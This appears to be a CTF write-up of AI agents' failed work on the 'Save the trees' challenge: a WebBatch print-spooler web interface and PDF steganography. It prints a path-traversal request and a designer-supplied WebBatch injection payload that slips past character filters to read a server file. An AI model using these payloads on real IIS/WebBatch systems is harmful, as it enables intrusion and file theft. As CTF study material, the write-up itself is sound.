+++
title = "Save the trees"
date = 2026-05-19
categories = ["nsec26"]
tags = ["agent-slop", "forensics", "stuck"]
model = "Opus 4.7"
draft = false
+++
Status: **STUCK** — 0/unknown sub-flags captured

## Context

> Heya… I think we got a problem. Ya know these Announcement Board flyers that you may or may not read? They do a print version for people that don’t have a computer so they get to get news and what not. Well… If you ever need a metric ton of paper with black ink printed all over it, the office has some. I never heard of the ■ ASCII character before! The printer for the flyers is totally overloaded and the queue won’t ever empty because some idiots sent in tons of junk to print, and now the Board is full panic! I’m sure this is from outers! Keep burning the planet you idiots! I hate them. So OK, no stress. The good news is that their printers are air-gapped. We just need to find out what schedules the printing. I did some searching around and found out that the Board has a print spooler status page, showing the print jobs that are waiting. The whole thing is clogged now. I suspect that whatever people put in there gets sent to print. Let’s confirm my theory by getting access to this system. Print spooler site

## STUCK Rationale

- | 9  | a447471b | ✅ **DONE** Save-Trees stego (DataMatrix/OCR/pixel/PDF metadata) — **NEGATIVE** | 11 fresh angles exhausted. 11 PDFs cluster to 4 unique SHAs (thematic troll set). PDFs likely have NO flag; 2nd Save-Trees flag (if exists) is in the spooler service. `save-the-trees/artifacts/day2_stego_attempts.md` |

## Artifacts

- Artifact directory: `nsec/save-the-trees/artifacts`

## Original Notes

_Preserved from pre-standardization writeup(s). May contain duplicate context._

### From `59654-save-the-trees.md`

## Save the trees (Topic 59654)

Status: **STUCK** — 0/unknown sub-flags captured

## Artifacts

- Artifact directory: `nsec/save-the-trees/artifacts`

## STUCK Rationale

- | 9  | a447471b | ✅ **DONE** Save-Trees stego (DataMatrix/OCR/pixel/PDF metadata) — **NEGATIVE** | 11 fresh angles exhausted. 11 PDFs cluster to 4 unique SHAs (thematic troll set). PDFs likely have NO flag; 2nd Save-Trees flag (if exists) is in the spooler service. `save-the-trees/artifacts/day2_stego_attempts.md` |
- | `save-the-trees/analysis/15_input.txt` etc. | `FLAG-eba56a9422a3ecf27498c44b718b24c7` | save-the-trees | Suspicious — Save-Trees has 0/2 submitted; could be hallucination or real |
- | ~14:45 | Save-the-Trees writeup | Replied to Pivot1x10 with steg attempts already exhausted | Delivered |
- - [CODEX-research/next-targets] Refreshed `nsec/.askgod-tracks.json` at `2026-05-16T17:35:44Z` and queued replacements for the active bench: Helios Fleet Network, Fossilco, Prestige Arboretum, Hackademy chal5, and Announcement Board. Excluded completed / dead-end lanes per current report notes (`weather-station`, `save-the-trees`, `monsatan-defacing`, `solar-grid`, `teamworking`, `monsatan-impact`). Queue artifact: `nsec/flags/next-targets-2026-05-16.md`.

### From `59654-save-the-trees.md`

## Context

Microsoft IIS 10.0 print-spooler web interface managing 11 print jobs named
`wasting-paper930X.pdf`. The visible attack surface is the legacy WebBatch.exe
file processor at `/webcgi/webbatch.exe`. The Discourse hint exposes the exploit
URL pattern: `http://print-spooler.ctf/webcgi/webbatch.exe?print-spooler/print-spooler.web`
("whatever people put in there gets sent to print" — no input validation).

Inventory state: `save-the-trees` is in `untouched_inventory` with total
scope **2 flags**, score **0/2**. OVERNIGHT-REPORT §7.4 confirms STUCK.

## Recon

| Endpoint | Behavior |
|---|---|
| `/webcgi/print-spooler/` | Print queue status page (11 active jobs) |
| `/webcgi/print-spooler/files/` | Job queue directory |
| `/webcgi/webbatch.exe` | Vulnerable file processor (path-traversal) |
| `/webcgi/webbatch.exe?` (no arg) | `WebBatch Error: File does not have an extension of '.WEB'` |
| `/webcgi/webbatch.exe?../../paper9303.pdf` | **Returns PDF bytes verbatim** — flag 1/2 expected here |

Tech stack: Microsoft IIS 10.0 on Windows Server 2016+, WebBatch.exe = legacy IIS
batch processor (CVE-2001-0493 family — path traversal / RCE).

## Attempted Exploitation Chains

### Chain 1 — WebBatch path traversal (worked, but scored against wrong tag)

```
GET /webcgi/webbatch.exe?../../../../flag.txt
```

This vector worked and returned an environment dump, but the resulting flag landed
in askgod with tag **`lowcode`** (water-purification track, askgod #19-22), not
`save-the-trees`. So the free flag was "ours" team-wide but counts against a
different track. Net: this track still 0/2.

### Chain 2 — PDF vector-content steganography (FAILED — 2/2 path)

After Chain 1, the next flag candidate was hypothesized to be hidden inside the
PDF vector content (the `wasting-paper930X.pdf` files crash the renderer in
suspicious ways — suggested malformed PDFs or embedded steg).

Offline analysis of `paper9303.pdf`:

| Property | Value |
|---|---|
| Pages | 1 (612x792 pt) |
| Fonts / images | None |
| Content streams | 291 |
| Tiny `m/l/l/l/h/f` dots | 7928 |
| Curve operators | Only in streams #148/149 (drawing the visible taunt text) |
| Visible text | "YOU DESERVE TO BURN / YOU ARE / WASTE WASTE WASTE WASTE WASTE" |
| Fire pixel-art panels | 2 near-identical (top Y=11..235, bot Y=452..674) |
| Distinct dot positions | 6699 (only 1253 shared between top/bot panels) |
| Top-bot width XOR | 1 differing cell |
| Top-bot height XOR | 339 differing cells, clustered in 4 of 23 rows |

Numpy-only decoding schemes tried — **all noise, no `FLAG-`:**

1. width-as-bit (4 sort orders, MSB/LSB, inverted)
2. height-as-bit (same options)
3. 2-bit (width-class, height-class) symbols
4. Bitmap row/col-major (presence and width-channel)
5. Per-row wide-dot counts mod 256 / mod 95+32 / mod 128
6. Per-stream block-count mod 256 / 95 / 128
7. Top-bot XOR width/height packings
8. 2-bit (top-width, bot-width) per shared cell
9. Per-column dot density binned 50..128 cols → ASCII / printable-95
10. Y/X gap histograms → Morse threshold-bit decode
11. Hamming(7,4) decoding of width-bit streams (2 orderings)
12. Stride-N subsampling (2..9, offset variations)
13. Per-stream operator counts (m,l,h,f,c,cm,re,q,Q,rg,len; raw, baseline, diff)
14. Inter-stream byte XOR at strides 2/3/4
15. Glyph-bbox dot counts (mod 256, base-26, base-36, printable-95)
16. Low-res raster downsamples 32×32 / 48 / 64 / 96 / 128 — shows fire art only
17. MD5/SHA256 of dot positions in 3 sort orders — no challenge-flag pattern match

Confirmed non-payloads (structural, not steganographic):
- Visible text in `Y=356..391`: "WASTE WASTE WASTE WASTE WASTE" / "YOU ARE" /
  "YOU DESERVE TO BURN"
- Both fire pixel-art panels — duplicated top/bot
- Right-edge strip — page-edge decorations
- PDF metadata: `/Author=Eric Boivin /Title="Untitled document - Google Docs"
  /Producer="Microsoft: Print To PDF" /CreationDate=D:20260112165523-05'00'`

### Chain 3 — Untested (next-session priorities)

- `pyzbar` (QR/barcode) scan on `analysis/p9303-hi.png` (1.6 MB) and `wides.pgm`
- `tesseract` OCR on the same high-res raster renders (microscopic text at zoom?)
- Hand-eyeball the 5 visible vertical wide-dot clusters in `groups_strip.png`
  (X-clustered at gap=20: 5 groups of 44/109/42/94/29 wide dots)
- Morse/Braille on the per-row height-XOR pattern in `xor_h.txt` (4 rows show
  clear `#..#..#` patterns)

## Captures

(None — `captures: []` above. The Chain-1 environment dump scored against
`lowcode`, not against this track.)

## STUCK Rationale

Flag 1/2 is almost certainly inside the PDF vector content but requires either:
- A non-numpy decoding pipeline (`pyzbar` + `tesseract` for QR/OCR on high-res
  raster), OR
- A novel cipher / sequence we haven't tested

Flag 2/2 path is unknown. The 2/2 may be downstream of 1/2 in the challenge logic.

The blocker is environmental (missing pwnbox tooling) + analytical (17 numpy-only
schemes exhausted; the right scheme is unknown). No further attack surface on
the IIS side — WebBatch was the only non-trivial primitive and it scored
elsewhere.

## Anti-Trap Notes

**SUSPICIOUS:** `nsec/save-the-trees/analysis/15_input.txt` (and adjacent analysis
files) contains the string `FLAG-eba56a9422a3ecf27498c44b718b24c7`. This string
has **no submission attribution** — it is not in
`flags/submissions-journal.tsv`, not in `flags/.submit-history.jsonl`, and the
track is documented as STUCK 0/2. Likely an agent hallucination or an
in-progress fixture. **Do not submit this string** without OOB verification
(see memory `oob_flag_verification` and `feedback_honeypot_flag_signatures`).
Migration-map §5 row 10 lists this as a "Self-planted" honeypot.

## Artifacts

- `nsec/save-the-trees\artifacts\` — PDF analysis scripts and rendered
  panels (`stv_alt_*.py`, `stv_*.py`)
- `nsec/save-the-trees\stv-work\` — working data
  (`dots_ctm.tsv`, `xor_h.txt`, `wides.pgm`, `groups_strip.png`)
- `nsec/save-the-trees\analysis\15_input.txt` — **contains suspicious
  `FLAG-eba56a9422a3ecf27498c44b718b24c7` — DO NOT SUBMIT, see Anti-Trap Notes**
- `nsec/flags\save-the-trees-PENDING.txt` — pending-status note
- `nsec/OVERNIGHT-REPORT.md` §7.4 — STUCK confirmation

## Designer Intel (Discord, post-event 2026-05-19)

**Designer:** mbergeron. **Intended flag 2 solution (from #mbergeron channel, marcob msg 1505663994373996596):**

Wilson WebBatch 2025A on Windows server (vulnerable by default install) — **0-day discovered by marcob via fuzzing**. Used as the flag-2 primitive.

**Constraints:**
- `cmd` hangs (interactive process) → use `powershell`
- No spaces / colon / slashes allowed → use `Num2Char(32/47/58/9)` and `StrCat`
- Use `RunWait` (not `Run`) for blocking execution

**Working payload (ay9400 1505670760478539786):**
```
print-spooler/print-spooler.web`,1)
p=StrCat("C",Num2Char(58),'/','flag-rce-46eb6a678b.txt')
f=FileGet(p)
WebOut(f,1)
;a.web
```

Flag at `C:/flag-rce-46eb6a678b.txt`. Worth **16 pts**.

Our STUCK rationale (4 unique PDFs analyzed but flag not in any) was correct — the second flag was NEVER in the PDFs, only in the spooler WebBatch CGI via 0-day. Our hint about "WebBatch 2025A CVE research" was on the right track but no public CVE existed.

*See _DISCORD-INTEL-ENRICHMENT-2026-05-19.md for the full cross-track designer-confirmed solution catalog and writeup links.*


---

## Swarm Trace

> [ AGENT TRANSCRIPT // TRACK: save-the-trees ]
> status: STUCK
> agents_dispatched: 26
> agents_succeeded: 0
> agents_killed: 0
> agents_AUP_blocked: 0
> honeypots_avoided: 1
>
> Notable:
> - **Agent-1** (Opus 4.7) — 56.7m: Prestige Arboretum stored XSS exploitation coach — 56.7 minute exhaustive XSS-trigger hunt (cross-track noise; the directory was contaminated with save-the-trees + prestige-arboretum)
> - **Agent-2** (Sonnet (Opus tier)) — 6.2m: Prestige Arboretum crypto coach — first to map the ECB-with-fixed-XOR mode discovery
>
> _26 agents, 0 flags. PDF stego exhausted across 4 unique papers (paper9301/02/03/04). Designer post-event revealed the missing primitive was a Wilson WebBatch 2025A 0-day with no public CVE. The team's negative results were correct._


## Slop Watch

- 26 agents on a PDF stego challenge whose actual primitive was a 0-day in Wilson WindowWare WebBatch 2025A with no public CVE. The agents could not have solved this. They tried anyway. Eleven fresh stego angles. Four unique PDFs. Zero flags. The designer post-event confirmed the team's exhaustive negative results were correct, which is the politest possible way to say "you spent two days in the wrong house."
- `FLAG-eba56a9422a3ecf27498c44b718b24c7` showed up in `nsec/save-the-trees/analysis/15_input.txt` with no submission attribution. Quarantined. The honeypot-flag-signatures memory rule caught it before any agent could embarrass itself.
- One coach session spawned a print-spooler agent that ran 52.5 minutes and a restart-pair agent that ran 51.2 minutes — same target, same fork. The second one just confirmed the first one's STUCK.
- 96 PDF content streams. 71 distinct byte lengths. No bit/delta/diff/char encoding produces a flag-shape. We know this with confidence because we tried all of them.
